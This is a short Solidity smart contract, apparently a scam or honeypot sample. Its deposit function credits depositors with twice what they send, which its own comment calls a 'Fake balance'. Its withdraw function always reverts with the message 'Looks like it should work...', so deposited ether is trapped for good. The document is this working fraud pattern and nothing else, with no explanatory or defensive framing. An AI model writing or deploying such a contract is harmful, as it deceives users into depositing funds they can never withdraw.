contract FakeBalance {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] = msg.value * 2; // Fake balance
    }

    function withdraw() external {
        require(false, "Looks like it should work...");
    }

    function checkBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}
